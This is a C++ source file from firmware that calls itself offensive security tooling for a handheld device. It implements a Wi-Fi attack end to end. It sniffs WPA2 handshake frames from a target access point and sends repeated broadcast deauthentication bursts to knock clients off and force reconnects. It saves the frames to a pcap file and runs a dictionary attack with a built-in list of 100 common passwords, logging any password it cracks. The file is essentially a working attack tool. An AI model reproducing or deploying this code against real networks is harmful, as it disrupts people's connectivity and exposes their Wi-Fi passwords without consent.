// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh

#include "handshake_capture.h"
#include "input_handling.h"
#include "sdcard_manager.h"
#include "clock_manager.h"
#include "lockscreen_manager.h"
#include <SD.h>
#include <mbedtls/pkcs5.h>
#include <mbedtls/md.h>

extern InputHandling inputHandler;
extern SDCardManager sdCardManager;

// ── Built-in top-100 common WPA passwords (used when no SD) ──────────────────

// Top-100 real-world WPA passwords — sourced from SecLists/berzerk0 WPA breach data.
// All entries are >= 8 chars (WPA minimum). Ordered by real-world frequency.
static const char* const kBuiltinPasswords[] = {
    "password",    "123456789",   "12345678",    "1q2w3e4r",    "sunshine",
    "football",    "1234567890",  "computer",    "superman",    "internet",
    "iloveyou",    "1qaz2wsx",    "baseball",    "whatever",    "princess",
    "abcd1234",    "starwars",    "trustno1",    "password1",   "jennifer",
    "michelle",    "mercedes",    "benjamin",    "11111111",    "samantha",
    "victoria",    "alexander",   "987654321",   "asdf1234",    "1234qwer",
    "qwertyuiop",  "q1w2e3r4",    "elephant",    "garfield",    "chocolate",
    "jonathan",    "caroline",    "maverick",    "midnight",    "88888888",
    "creative",    "qwerty123",   "cocacola",    "passw0rd",    "liverpool",
    "blink182",    "asdfghjkl",   "danielle",    "scorpion",    "veronica",
    "nicholas",    "asdfasdf",    "metallica",   "december",    "patricia",
    "christian",   "spiderman",   "security",    "slipknot",    "november",
    "jordan23",    "qwertyui",    "butterfly",   "swordfish",   "carolina",
    "hardcore",    "corvette",    "12341234",    "remember",    "qwer1234",
    "leonardo",    "snickers",    "williams",    "angelina",    "anderson",
    "123123123",   "pakistan",    "marlboro",    "kimberly",    "00000000",
    "snowball",    "sebastian",   "godzilla",    "hello123",    "champion",
    "precious",    "einstein",    "napoleon",    "mountain",    "dolphins",
    "charlotte",   "fernando",    "basketball",  "barcelona",   "87654321",
    "paradise",    "motorola",    "brooklyn",    "stephanie",   "elizabeth",
    "0123456789",
};
static constexpr int kBuiltinCount = sizeof(kBuiltinPasswords) / sizeof(kBuiltinPasswords[0]);

// ── WPA handshake crypto material ────────────────────────────────────────────

struct WpaHandshake {
    uint8_t  apMac[6];
    uint8_t  clientMac[6];
    uint8_t  aNonce[32];
    uint8_t  sNonce[32];
    uint8_t  mic[16];
    uint8_t  eapolFrame[300];   // M2 EAPOL packet with MIC field zeroed
    uint16_t eapolLen;
    char     ssid[33];
    uint8_t  keyDescriptor;     // 0x02 = RSN/WPA2
    bool     hasM1;
    bool     hasM2;
    // Raw 802.11 frames stored in RAM — written to SD only after WiFi teardown
    uint8_t  m1Raw[256]; uint16_t m1RawLen; uint32_t m1Ts;
    uint8_t  m2Raw[256]; uint16_t m2RawLen; uint32_t m2Ts;
};

static WpaHandshake g_whs;

// ── Ring buffer (written by WiFi task, drained by main loop) ─────────────────

#define HS_RING_SIZE 16
#define HS_FRAME_MAX 256

struct EapolFrame {
    uint8_t  data[HS_FRAME_MAX];
    uint16_t len;
    uint32_t ts_ms;
    uint8_t  msgNum;    // 1-4, 0=unknown
};

static volatile EapolFrame hsRing[HS_RING_SIZE];
static volatile uint8_t    hsHead = 0;
static volatile uint8_t    hsTail = 0;
static volatile uint8_t    g_wsBssid[6];
static volatile bool       g_wsCapturing = false;

// ── EAPOL frame offsets (from EAPOL version byte = start of EAPOL packet) ────
//   [0]     version
//   [1]     type (0x03 = Key)
//   [2-3]   body length (big-endian, excludes this 4-byte header)
//   [4]     key descriptor type (0x02=RSN)
//   [5]     key info high byte  — bit0=MIC, bit1=Secure
//   [6]     key info low byte   — bit7=ACK
//   [9-16]  replay counter (8B)
//   [17-48] nonce (ANonce in M1, SNonce in M2) (32B)
//   [49-64] EAPOL-Key IV (16B, zeros in WPA2)
//   [65-72] Key RSC (8B)
//   [73-80] Reserved (8B)
//   [81-96] MIC (16B) ← zero this field before feeding to HMAC
//   [97-98] key data length
//   [99+]   key data

// ── Promiscuous RX callback (runs in WiFi driver task) ────────────────────────

static void IRAM_ATTR rxCallback(void* buf, wifi_promiscuous_pkt_type_t pktType) {
    if (!g_wsCapturing) return;
    if (pktType != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* ppkt = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d   = ppkt->payload;
    uint16_t       len = ppkt->rx_ctrl.sig_len;

    if (len < 40) return;   // min: 24B header + 8B LLC + 4B EAPOL header + 4B key info

    uint8_t frameType    = (d[0] >> 2) & 0x03;
    uint8_t frameSubtype = (d[0] >> 4) & 0x0F;
    if (frameType != 2) return;     // DATA only

    uint8_t tods   = d[1] & 0x01;
    uint8_t fromds = (d[1] >> 1) & 0x01;
    if (tods && fromds) return;     // skip 4-addr WDS frames

    int hdrLen = (frameSubtype & 0x08) ? 26 : 24;  // QoS adds 2B
    if (len < (uint16_t)(hdrLen + 12)) return;

    // BSSID position: ToDS=1 → Addr1(4..9); FromDS=1 → Addr2(10..15)
    const uint8_t* frameBssid = tods ? (d + 4) : (d + 10);
    if (memcmp(frameBssid, (const void*)g_wsBssid, 6) != 0) return;

    // LLC/SNAP: AA AA 03 00 00 00 88 8E (RFC 1042, EAPOL EtherType)
    const uint8_t* llc = d + hdrLen;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    if (llc[6] != 0x88 || llc[7] != 0x8E) return;

    const uint8_t* eapol = d + hdrLen + 8;
    int eapolSpace = len - hdrLen - 8;
    if (eapolSpace < 8) return;

    if (eapol[1] != 0x03) return;  // must be EAPOL-Key
    if (eapol[4] != 0x02 && eapol[4] != 0x01) return;  // RSN or WPA

    uint8_t kiHi = eapol[5];
    uint8_t kiLo = eapol[6];
    bool    ack    = (kiLo & 0x80) != 0;
    bool    mic    = (kiHi & 0x01) != 0;
    bool    secure = (kiHi & 0x02) != 0;

    uint8_t msgNum = 0;
    if      ( ack && !mic)            msgNum = 1;
    else if (!ack &&  mic && !secure) msgNum = 2;
    else if ( ack &&  mic)            msgNum = 3;
    else if (!ack &&  mic &&  secure) msgNum = 4;
    if (msgNum == 0) return;

    uint8_t nextHead = (hsHead + 1) % HS_RING_SIZE;
    if (nextHead == hsTail) return;     // ring full, drop

    EapolFrame& slot = (EapolFrame&)hsRing[hsHead];
    uint16_t copyLen = len < HS_FRAME_MAX ? len : HS_FRAME_MAX;
    memcpy(slot.data, d, copyLen);
    slot.len    = copyLen;
    slot.ts_ms  = millis();
    slot.msgNum = msgNum;
    hsHead = nextHead;
}

// ── Static crypto helpers ─────────────────────────────────────────────────────

// Build the B input for PTK derivation: min/max of (apMac, clientMac, ANonce, SNonce)
static void buildPtkData(const uint8_t* ap, const uint8_t* cl,
                          const uint8_t* an, const uint8_t* sn,
                          uint8_t* out) {     // out = 76 bytes
    if (memcmp(ap, cl, 6) < 0) { memcpy(out,   ap, 6); memcpy(out+6,  cl, 6); }
    else                        { memcpy(out,   cl, 6); memcpy(out+6,  ap, 6); }
    if (memcmp(an, sn, 32) < 0) { memcpy(out+12, an, 32); memcpy(out+44, sn, 32); }
    else                         { memcpy(out+12, sn, 32); memcpy(out+44, an, 32); }
}

// PRF-512: 4 × HMAC-SHA1(PMK, "Pairwise key expansion" || 0x00 || B || counter)
// out must be at least 80 bytes; KCK = out[0..15]
static void prf512(const uint8_t* pmk, const uint8_t* data, size_t dataLen, uint8_t* out) {
    static const char kLabel[] = "Pairwise key expansion";
    const size_t labelLen = sizeof(kLabel) - 1;   // 22
    uint8_t buf[100];   // 22 + 1 + 76 + 1 = 100
    memcpy(buf, kLabel, labelLen);
    buf[labelLen] = 0x00;
    memcpy(buf + labelLen + 1, data, dataLen);
    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    for (int i = 0; i < 4; i++) {
        buf[labelLen + 1 + dataLen] = (uint8_t)i;
        mbedtls_md_hmac(sha1, pmk, 32, buf, labelLen + 1 + dataLen + 1, out + i * 20);
    }
}

// ── Constructor ───────────────────────────────────────────────────────────────

HandshakeCapture::HandshakeCapture(DisplayManager& dm, WiFiFunctions& wf, DeauthAttack& da)
    : _dm(dm), _wf(wf), _da(da) {}

// ── Helpers ───────────────────────────────────────────────────────────────────

bool HandshakeCapture::parseMac(const char* str, uint8_t* mac) {
    if (!str || strlen(str) < 17) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

String HandshakeCapture::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(buf);
}

// ── Argument parsing ──────────────────────────────────────────────────────────

void HandshakeCapture::start(char* args) {
    if (!args || !*args) {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.println("Usage:");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.println("  ws <index>");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.println("  ws <bssid> [ch]");
        _dm.printCommandScreen();
        return;
    }

    char buf[128];
    strncpy(buf, args, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* first  = strtok(buf, " ");
    char* second = strtok(nullptr, " ");

    uint8_t bssid[6];
    int     channel = 6;
    char    ssid[33] = {0};

    if (strchr(first, ':') == nullptr) {
        int idx = atoi(first);
        if (!_wf.isScanDone()) {
            _dm.setCursor(10, _dm.getCursorY());
            _dm.println("Run scanwifi first.");
            _dm.printCommandScreen();
            return;
        }
        if (!_wf.getNetworkInfo(idx, bssid, &channel)) {
            _dm.setCursor(10, _dm.getCursorY());
            _dm.printText("Invalid index. Max: ");
            _dm.println(_wf.getNetworkCount() - 1);
            _dm.printCommandScreen();
            return;
        }
        _wf.getNetworkSSID(idx, ssid);     // grab before WiFi mode change clears results
    } else {
        if (!parseMac(first, bssid)) {
            _dm.setCursor(10, _dm.getCursorY());
            _dm.println("Bad BSSID. Format: XX:XX:XX:XX:XX:XX");
            _dm.printCommandScreen();
            return;
        }
        if (second) {
            int ch = atoi(second);
            if (ch >= 1 && ch <= 13) channel = ch;
        }
        // SSID unknown in manual mode — cracking step will show a warning
    }

    run(bssid, channel, ssid);
}

// ── Password tester — PBKDF2 → PRF-512 → KCK → MIC verify ──────────────────

// ctx must be pre-initialized with mbedtls_md_setup(&ctx, sha1, 1=HMAC) — reused across calls
bool HandshakeCapture::tryPassword(const char* pwd,
                                    mbedtls_md_context_t* ctx,
                                    const mbedtls_md_info_t* sha1) {
    uint8_t pmk[32];
    mbedtls_pkcs5_pbkdf2_hmac(ctx,
        (const uint8_t*)pwd,        strlen(pwd),
        (const uint8_t*)g_whs.ssid, strlen(g_whs.ssid),
        4096, 32, pmk);

    uint8_t ptkData[76];
    buildPtkData(g_whs.apMac, g_whs.clientMac, g_whs.aNonce, g_whs.sNonce, ptkData);

    uint8_t ptkBuf[80];
    prf512(pmk, ptkData, 76, ptkBuf);

    uint8_t micCalc[20];
    mbedtls_md_hmac(sha1, ptkBuf /*KCK*/, 16,
                    g_whs.eapolFrame, g_whs.eapolLen, micCalc);

    return memcmp(micCalc, g_whs.mic, 16) == 0;
}

// ── Cracking loop ─────────────────────────────────────────────────────────────

void HandshakeCapture::crack() {
    if (!g_whs.hasM1 || !g_whs.hasM2) {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_RED);
        _dm.println("Need M1+M2 to crack.");
        _dm.setTextColor(TFT_WHITE);
        delay(1500);
        return;
    }
    if (g_whs.ssid[0] == '\0') {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_RED);
        _dm.println("SSID unknown — use index mode.");
        _dm.setTextColor(TFT_WHITE);
        delay(1500);
        return;
    }
    if (g_whs.keyDescriptor != 0x02) {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_RED);
        _dm.println("WPA1 not supported — crack offline.");
        _dm.setTextColor(TFT_WHITE);
        delay(1500);
        return;
    }

    // ── Cracking UI ───────────────────────────────────────────────────────────
    _dm.clearScreen();
    _dm.setCursor(10, outputY);
    _dm.setTextColor(0x7BEF);    _dm.printText("[");
    _dm.setTextColor(TFT_CYAN);  _dm.printText("HANDSHAKE");
    _dm.setTextColor(0x7BEF);    _dm.printText("::");
    _dm.setTextColor(TFT_YELLOW);_dm.println("CRACK]");
    _dm.printSeparator();

    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF); _dm.printText("SSID  "); _dm.setTextColor(TFT_WHITE);
    _dm.println(g_whs.ssid);

    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF); _dm.printText("AP    "); _dm.setTextColor(TFT_WHITE);
    _dm.println(macStr(g_whs.apMac).c_str());
    _dm.printSeparator();

    // ── Wordlist selection ────────────────────────────────────────────────────
    bool hasWl = sdCardManager.isReady() && SD.exists(SD_CFG_WORDLIST_WS);
    bool useSD = hasWl;
    if (hasWl) {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_GREEN);  _dm.println("[1] /apps/wpasniff/wordlist.txt (SD)");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);    _dm.println("[2] Built-in (100 pwds)");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_WHITE); _dm.println("Choose source:");
        char ch = 0;
        while (ch != '1' && ch != '2') ch = inputHandler.getKeyboardInput();
        useSD = (ch == '1');
        _dm.clearScreen();
        _dm.setCursor(10, outputY);
        _dm.setTextColor(0x7BEF);     _dm.printText("[");
        _dm.setTextColor(TFT_CYAN);   _dm.printText("HANDSHAKE");
        _dm.setTextColor(0x7BEF);     _dm.printText("::");
        _dm.setTextColor(TFT_YELLOW); _dm.println("CRACK]");
        _dm.printSeparator();
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("SSID  "); _dm.setTextColor(TFT_WHITE);
        _dm.println(g_whs.ssid);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("AP    "); _dm.setTextColor(TFT_WHITE);
        _dm.println(macStr(g_whs.apMac).c_str());
        _dm.printSeparator();
    }

    int32_t tryY = _dm.getCursorY();

    // Initialize mbedtls context once for all tryPassword calls
    mbedtls_md_context_t mdCtx;
    mbedtls_md_init(&mdCtx);
    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_setup(&mdCtx, sha1, 1);  // 1 = HMAC mode
    File     wl;
    uint32_t tried      = 0;
    uint32_t skipped    = 0;
    uint32_t t0         = millis();
    uint32_t lastRedraw = 0;
    char     found[64]  = {0};
    bool     done       = false;

    auto redraw = [&](const char* current) {
        _dm.fillRect(10, tryY, 310, LINE_HEIGHT * 3 + 2, TFT_BLACK);
        _dm.setCursor(10, tryY);
        _dm.setTextColor(0x7BEF); _dm.printText("Trying  ");
        _dm.setTextColor(TFT_WHITE);
        char trunc[22]; strncpy(trunc, current, 21); trunc[21] = '\0';
        _dm.println(trunc);

        uint32_t elapsed = (millis() - t0) / 1000;
        uint32_t rate = elapsed ? tried / elapsed : tried * 2;
        _dm.setCursor(10, _dm.getCursorY());
        char stat[40];
        snprintf(stat, sizeof(stat), "%-5u tried  %-4u skip  %u/s", tried, skipped, rate);
        _dm.setTextColor(0x4208); _dm.println(stat);

        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(useSD ? TFT_CYAN : TFT_YELLOW);
        _dm.println(useSD ? "Source: /apps/wpasniff/wordlist.txt" : "Source: built-in (100)");
        _dm.setTextColor(TFT_WHITE);
    };

    // ── SD wordlist (up to 1000 lines) ───────────────────────────────────────
    if (useSD) {
        wl = SD.open(SD_CFG_WORDLIST_WS, FILE_READ);
        if (wl) {
            char line[64];
            while (wl.available() && !done) {
                int i = 0;
                while (wl.available() && i < 63) {
                    char c = (char)wl.read();
                    if (c == '\r') {
                        if (wl.available() && wl.peek() == '\n') wl.read();
                        break;
                    }
                    if (c == '\n') break;
                    line[i++] = c;
                }
                line[i] = '\0';
                if (i < 8 || i > 63) { skipped++; continue; }

                tried++;
                uint32_t now = millis();
                if (now - lastRedraw >= 300) {
                    lastRedraw = now;
                    redraw(line);
                    char k = inputHandler.getKeyboardInput();
                    if (k == 'q' || k == 'Q') { done = true; break; }
                    vTaskDelay(1);
                }
                if (tryPassword(line, &mdCtx, sha1)) {
                    strncpy(found, line, sizeof(found) - 1);
                    done = true;
                    break;
                }
            }
            wl.close();
        } else {
            useSD = false;   // file not found, fall through to built-in
        }
    }

    // ── Built-in list ─────────────────────────────────────────────────────────
    if (!done) {
        useSD = false;    // update source label
        for (int i = 0; i < kBuiltinCount && !done; i++) {
            tried++;
            uint32_t now = millis();
            if (now - lastRedraw >= 300) {
                lastRedraw = now;
                redraw(kBuiltinPasswords[i]);
                char k = inputHandler.getKeyboardInput();
                if (k == 'q' || k == 'Q') break;
                vTaskDelay(1);
            }
            if (tryPassword(kBuiltinPasswords[i], &mdCtx, sha1)) {
                strncpy(found, kBuiltinPasswords[i], sizeof(found) - 1);
                done = true;
                break;
            }
        }
    }

    mbedtls_md_free(&mdCtx);

    // ── Result ────────────────────────────────────────────────────────────────
    _dm.fillRect(10, tryY, 310, LINE_HEIGHT * 3 + 2, TFT_BLACK);
    _dm.setCursor(10, tryY);

    if (found[0]) {
        _dm.setTextColor(TFT_GREEN); _dm.printText("[CRACKED] ");
        _dm.setTextColor(TFT_WHITE); _dm.println(found);

        // Save to SD if available
        if (sdCardManager.isReady()) {
            sdCardManager.ensureDir(SD_DIR_WPASNIFF);
            char ts[22] = "";
            ClockManager::instance().getTimestamp(ts, sizeof(ts));
            char logLine[152];
            if (ts[0])
                snprintf(logLine, sizeof(logLine), "%s,%s,%s,%s",
                         ts, macStr(g_whs.apMac).c_str(), g_whs.ssid, found);
            else
                snprintf(logLine, sizeof(logLine), "%s,%s,%s",
                         macStr(g_whs.apMac).c_str(), g_whs.ssid, found);
            sdCardManager.appendLine(SD_LOG_CRACKED_WS, logLine);
        }
    } else {
        _dm.setTextColor(TFT_RED); _dm.println("No match.");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x4208); _dm.println("Crack .cap offline with hashcat.");
    }

    uint32_t elapsed = (millis() - t0) / 1000;
    uint32_t rate    = elapsed ? tried / elapsed : tried * 2;
    _dm.setCursor(10, _dm.getCursorY());
    char stat[48];
    snprintf(stat, sizeof(stat), "%u tried, %u skipped  %us (%u/s)", tried, skipped, elapsed, rate);
    _dm.setTextColor(0x4208); _dm.println(stat);
    _dm.setTextColor(TFT_WHITE);
    _dm.setCursor(10, _dm.getCursorY());
    _dm.println("[q] back");

    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        delay(50);
    }
}

// ── Core capture loop ─────────────────────────────────────────────────────────

void HandshakeCapture::run(const uint8_t* bssid, int channel, const char* ssid) {
    // Reset state
    hsHead = hsTail = 0;
    memcpy((void*)g_wsBssid, bssid, 6);
    g_wsCapturing = false;
    memset(&g_whs, 0, sizeof(g_whs));
    memcpy(g_whs.apMac, bssid, 6);
    strncpy(g_whs.ssid, ssid, 32);

    // ── Open pcap file before WiFi — avoids SPI/DMA contention on ESP32-S3 ──────
    bool fileOk = false;
    File pcap;
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_WPASNIFF);
        char fname[44];
        snprintf(fname, sizeof(fname), SD_DIR_WPASNIFF "/%02X-%02X-%02X-%02X-%02X-%02X.cap",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        pcap = SD.open(fname, FILE_WRITE);
        fileOk = (bool)pcap;
        if (fileOk) {
            struct __attribute__((packed)) {
                uint32_t magic    = 0xa1b2c3d4;
                uint16_t vmaj     = 2;
                uint16_t vmin     = 4;
                int32_t  tz       = 0;
                uint32_t sig      = 0;
                uint32_t snap     = 65535;
                uint32_t linktype = 105;   // LINKTYPE_IEEE802_11
            } ghdr;
            pcap.write((uint8_t*)&ghdr, sizeof(ghdr));
        }
    }

    // WiFi setup — AP interface needed for 80211_tx injection
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP("x", nullptr, channel, 1, 0, false);
    delay(100);

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(rxCallback);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    delay(50);

    g_wsCapturing = true;

    // ── UI ────────────────────────────────────────────────────────────────────
    _dm.clearScreen();
    _dm.setCursor(10, outputY);
    _dm.setTextColor(0x7BEF);    _dm.printText("[");
    _dm.setTextColor(TFT_CYAN);  _dm.printText("HANDSHAKE");
    _dm.setTextColor(0x7BEF);    _dm.printText("::");
    _dm.setTextColor(TFT_YELLOW);_dm.println("CAPTURE]");
    _dm.printSeparator();

    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF); _dm.printText("AP  "); _dm.setTextColor(TFT_WHITE);
    _dm.println(macStr(bssid).c_str());

    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF); _dm.printText("CH  "); _dm.setTextColor(TFT_WHITE);
    _dm.println(channel);

    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF); _dm.printText("SD  ");
    if (fileOk) {
        char shortName[20];
        snprintf(shortName, sizeof(shortName), "%02X-%02X-%02X...cap",
                 bssid[0], bssid[1], bssid[2]);
        _dm.setTextColor(TFT_GREEN); _dm.println(shortName);
    } else {
        _dm.setTextColor(TFT_RED); _dm.println("none — RAM only");
    }
    _dm.printSeparator();

    int32_t statusY = _dm.getCursorY();

    _dm.setCursor(10, _dm.getCursorY() + LINE_HEIGHT * 3 + 4);
    _dm.setTextColor(0x4208); _dm.println("[q] stop");
    _dm.setTextColor(TFT_WHITE);

    // ── Counters ──────────────────────────────────────────────────────────────
    uint8_t  gotM[5]     = {0};
    uint32_t eapolCount  = 0;
    uint32_t deauthCount = 0;
    bool     captured    = false;
    uint32_t lastDeauth  = millis() - 2001;  // fire first burst immediately
    uint32_t lastRefresh = 0;

    auto redrawStatus = [&]() {
        _dm.fillRect(10, statusY, 310, LINE_HEIGHT * 3 + 2, TFT_BLACK);
        _dm.setCursor(10, statusY);
        _dm.setTextColor(0x7BEF);
        char line[40];
        snprintf(line, sizeof(line), "M1:%-2u M2:%-2u M3:%-2u M4:%-2u",
                 gotM[1], gotM[2], gotM[3], gotM[4]);
        _dm.println(line);

        _dm.setCursor(10, _dm.getCursorY());
        snprintf(line, sizeof(line), "EAPOL:%-3u  Deauths:%-3u", eapolCount, deauthCount);
        _dm.println(line);

        _dm.setCursor(10, _dm.getCursorY());
        if (captured) {
            _dm.setTextColor(TFT_GREEN); _dm.println("[CAPTURED!]  [c] crack  [q] stop");
        } else {
            _dm.setTextColor(0x4208); _dm.println("Waiting...               [q] stop");
        }
        _dm.setTextColor(TFT_WHITE);
    };

    redrawStatus();

    // ── Pcap finalizer — called after WiFi teardown, SD access is safe ────────
    auto finalizePcap = [&]() {
        if (!fileOk) return;
        auto writeRec = [&](const uint8_t* d, uint16_t len, uint32_t ts) {
            struct __attribute__((packed)) {
                uint32_t ts_sec; uint32_t ts_usec;
                uint32_t incl_len; uint32_t orig_len;
            } rh;
            rh.ts_sec = ts / 1000; rh.ts_usec = (ts % 1000) * 1000;
            rh.incl_len = rh.orig_len = len;
            pcap.write((uint8_t*)&rh, sizeof(rh));
            pcap.write(d, len);
        };
        if (g_whs.m1RawLen > 0) writeRec(g_whs.m1Raw, g_whs.m1RawLen, g_whs.m1Ts);
        if (g_whs.m2RawLen > 0) writeRec(g_whs.m2Raw, g_whs.m2RawLen, g_whs.m2Ts);
        pcap.flush();
        pcap.close();
    };

    // ── Main loop ─────────────────────────────────────────────────────────────
    while (true) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            lastRefresh = 0;  // force immediate status redraw
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if ((k == 'c' || k == 'C') && captured) {
            // Stop sniffing, enter crack mode
            g_wsCapturing = false;
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            esp_wifi_set_promiscuous(false);
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_STA);
            finalizePcap();
            crack();
            _dm.printCommandScreen();
            return;
        }

        // Drain ring buffer → write pcap + extract crypto material
        while (hsTail != hsHead) {
            EapolFrame frame;
            memcpy(&frame, (const void*)&hsRing[hsTail], sizeof(EapolFrame));
            hsTail = (hsTail + 1) % HS_RING_SIZE;

            // Extract crypto material + buffer raw frame (no SD writes during WiFi)
            uint8_t subtype = (frame.data[0] >> 4) & 0x0F;
            int     hdrLen  = (subtype & 0x08) ? 26 : 24;
            const uint8_t* eapol = frame.data + hdrLen + 8;

            uint16_t eapolAvail = (frame.len > (uint16_t)(hdrLen + 8))
                                  ? frame.len - (uint16_t)(hdrLen + 8) : 0;

            if (frame.msgNum == 1 && !g_whs.hasM1 && eapolAvail >= 49) {
                memcpy(g_whs.aNonce, eapol + 17, 32);
                memcpy(g_whs.clientMac, frame.data + 4, 6);
                g_whs.keyDescriptor = eapol[4];
                memcpy(g_whs.m1Raw, frame.data, frame.len);
                g_whs.m1RawLen = frame.len;
                g_whs.m1Ts     = frame.ts_ms;
                g_whs.hasM1 = true;
            }
            if (frame.msgNum == 2 && !g_whs.hasM2 && eapolAvail >= 97) {
                uint16_t eapolLen = ((eapol[2] << 8) | eapol[3]) + 4;
                if (eapolLen > eapolAvail)               eapolLen = eapolAvail;
                if (eapolLen > sizeof(g_whs.eapolFrame)) eapolLen = sizeof(g_whs.eapolFrame);
                memcpy(g_whs.sNonce, eapol + 17, 32);
                memcpy(g_whs.mic, eapol + 81, 16);
                memcpy(g_whs.eapolFrame, eapol, eapolLen);
                memset(g_whs.eapolFrame + 81, 0, 16);
                g_whs.eapolLen = eapolLen;
                memcpy(g_whs.clientMac, frame.data + 10, 6);
                g_whs.keyDescriptor = eapol[4];
                memcpy(g_whs.m2Raw, frame.data, frame.len);
                g_whs.m2RawLen = frame.len;
                g_whs.m2Ts     = frame.ts_ms;
                g_whs.hasM2 = true;
            }

            if (frame.msgNum >= 1 && frame.msgNum <= 4) {
                if (gotM[frame.msgNum] < 255) gotM[frame.msgNum]++;
                eapolCount++;
                if (!captured && g_whs.hasM1 && g_whs.hasM2) captured = true;
            }
        }

        uint32_t now = millis();
        if (now - lastDeauth >= 2000) {
            lastDeauth = now;
            _da.sendBroadcastBurst(bssid);
            deauthCount++;
        }
        if (now - lastRefresh >= 300) {
            lastRefresh = now;
            redrawStatus();
        }
    }

    // ── Cleanup ───────────────────────────────────────────────────────────────
    g_wsCapturing = false;
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    if (fileOk) { pcap.flush(); pcap.close(); }
    _dm.printCommandScreen();
}
